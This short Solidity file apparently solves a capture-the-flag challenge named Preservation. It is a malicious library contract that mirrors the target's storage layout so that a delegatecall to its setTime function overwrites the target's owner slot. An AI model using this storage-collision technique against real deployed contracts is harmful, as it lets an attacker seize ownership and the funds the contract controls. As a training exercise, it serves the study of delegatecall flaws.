// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Preservation.sol";

contract Solution {
    // public library contracts
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;
    uint256 storedTime;

    function setTime(uint256 _timeStamp) public {
        owner = address(uint160(_timeStamp));
    }
}
